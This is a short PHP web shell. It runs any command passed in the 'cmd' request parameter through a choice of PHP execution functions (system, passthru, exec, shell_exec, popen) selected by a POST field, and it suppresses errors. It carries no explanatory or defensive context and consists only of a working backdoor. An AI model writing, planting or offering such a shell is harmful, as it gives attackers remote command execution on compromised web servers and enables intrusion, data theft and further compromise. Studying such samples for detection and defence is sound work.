<?php
$command = $_REQUEST['cmd'];
switch ($_POST['execfunction']) {
	case 'system':
		@system($command);
	    break;
	case 'passthru':
		@passthru($command);
		break;
	case 'exec':
		@exec($command);
		break;
	case 'execute':
		@execute($command);
		break;
	case 'shell_exec':
		@shell_exec($command);
		break;
	case 'popen':
		@fread(popen($command,r), 9999);
		break;
}
?>